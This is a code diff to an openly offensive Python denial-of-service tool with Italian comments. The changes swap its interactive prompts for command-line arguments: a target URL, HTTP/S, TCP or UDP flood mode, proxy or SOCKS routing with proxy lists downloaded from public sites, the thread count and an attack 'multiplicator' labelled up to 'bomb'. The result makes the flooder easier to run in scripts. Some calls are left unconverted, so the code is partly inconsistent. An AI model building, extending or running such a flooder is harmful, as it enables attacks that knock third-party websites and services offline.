@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+import argparse
 import requests
 import asyncio
 import ovh
@@ -1077,16 +1079,12 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			]
 
 
-def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
+def starturl(args): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
 	global url
 	global url2
 	global urlport
 
-	url = input("\nInsert URL/IP: ").strip()
-
-	if url == "":
-		print ("Please enter the url.")
-		starturl()
+	url = args["url"].strip()
 
 	try:
 		if url[0]+url[1]+url[2]+url[3] == "www.":
@@ -1097,7 +1095,6 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 			url = "https://" + url
 	except:                                                                                              
 		print("You mistyped, try again.")
-		starturl()
 
 	try:                                
 		url2 = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[0]
@@ -1108,21 +1105,21 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 		urlport = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[1]
 	except:
 		urlport = "443"
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
-	floodmode()
+	floodmode(args)
                                                     
-def floodmode(): # la scelta della modalità di attacco
+def floodmode(args): # la scelta della modalità di attacco
 	global choice1
-	choice1 = input("Do you want to perform HTTP/S flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
+	choice1 = args["flood_type"]
+	#input("Do you want to perform HTTP/S flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
 	if choice1 == "0":
-		proxymode()
+		proxymode(args)
 	elif choice1 == "1":
 		try:
 			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
 				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
 				exit(0) # e esce
 			else: # altrimenti
-				floodport() # continua
+				floodport(args) # continua
 		except:
 			pass
 	elif choice1 == "2":
@@ -1131,14 +1128,13 @@ def floodmode(): # la scelta della modalità di attacco
 				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
 				exit(0) # e esce
 			else: # altrimenti
-				floodport() # continua
+				floodport(args) # continua
 		except:
 			pass
 	else:
 		print ("You mistyped, try again.")
-		floodmode()
 
-def floodport():
+def floodport(args):
 	global port
 	try:
 		port = int(input("Enter the port you want to flood: "))
@@ -1153,40 +1149,43 @@ def floodport():
 		floodport() # riparte la funzione e ti fa riscrivere
 	proxymode()
 
-def proxymode():
+def proxymode(args):
 	global choice2
-	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	choice2 = args["proxy"]
+	#input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
 	if choice2 == "y":
-		choiceproxysocks()
+		choiceproxysocks(args)
 	else:
-		numthreads()
+		numthreads(args)
 
-def choiceproxysocks():
+def choiceproxysocks(args):
 	global choice3
-	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	choice3 = args["proxy_type"]
+#	input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
 	if choice3 == "0":
-		choicedownproxy()
+		choicedownproxy(args)
 	elif choice3 == "1":
-		choicedownsocks()
+		choicedownsocks(args)
 	else:
 		print ("You mistyped, try again.")
-		choiceproxysocks()
 
-def choicedownproxy():
-	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+def choicedownproxy(args):
+	choice4 = args["download_proxy"]
+	#input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
 	else:
-		proxylist()
+		proxylist(args)
                                                  
-def choicedownsocks():
-	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
+def choicedownsocks(args):
+	choice4 = args["download_proxy"]
+	#input("Do you want to download a new list of socks? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
 	else:
-		proxylist()
+		proxylist(args)
                          
 def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 	try:
@@ -1213,44 +1212,46 @@ def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 		print ("\nERROR!\n")
 	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
 
-def proxylist():
+def proxylist(args):
 	global proxies
-	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
+	out_file = args["proxy_file"]
+	#str(input("Enter the proxylist filename/path (proxy.txt): "))
 	if out_file == "":
 		out_file = "proxy.txt"
 	proxies = open(out_file).readlines()
-	numthreads()
+	numthreads(args)
 
-def numthreads():
+def numthreads(args):
 	global threads
 	try:
-		threads = int(input("Insert number of threads (800): "))
+		threads = args["threads"]
+		#int(input("Insert number of threads (800): "))
 	except ValueError:
 		threads = 800
 		print ("800 threads selected.\n")
-	multiplication()
+	multiplication(args)
 
-def multiplication():
+def multiplication(args):
 	global multiple
 	try:
-		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+		multiple = args["multiplicator"]
+		#int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
 	except ValueError:
 		print("You mistyped, try again.\n")
-		multiplication()
-	begin()
+	begin(args)
 
-def begin():
+def begin(args):
 	choice6 = input("Press 'Enter' to start attack: ")
 	if choice6 == "":
-		loop()
+		loop(args)
 	elif choice6 == "Enter": #lool
-		loop()
+		loop(args)
 	elif choice6 == "enter": #loool
-		loop()
+		loop(args)
 	else:
 		exit(0)
 
-def loop():
+def loop(args):
 	global threads
 	global get_host
 	global acceptall
@@ -1632,5 +1633,16 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 
 
 if __name__ == '__main__':
-	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
+	parser = argparse.ArgumentParser()
+	parser.add_argument("url", type=str, help="target URL")
+	parser.add_argument("proxy", type=str, help="Use proxy? (y/n)")
+	parser.add_argument("--proxy_file", type=str, default="proxy.txt", help="Custom proxy filename")
+	parser.add_argument("--flood_type", type=str, default="0", help="Flood type: 0-http(s), 1-TCP, 2-UDP")
+	parser.add_argument("--proxy_type", type=str, default="0", help="Proxy type: 0-proxymode, 1-socksmode")
+	parser.add_argument("--download_proxy", type=str, default="n", help="Update list of proxies")
+	parser.add_argument("--threads", type=int, default=800, help="Number of threads")
+	parser.add_argument("--multiplicator", type=int, default=50, help="Attack multiplier")
+
+	args = vars(parser.parse_args())
+	starturl(args) # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
                                                     
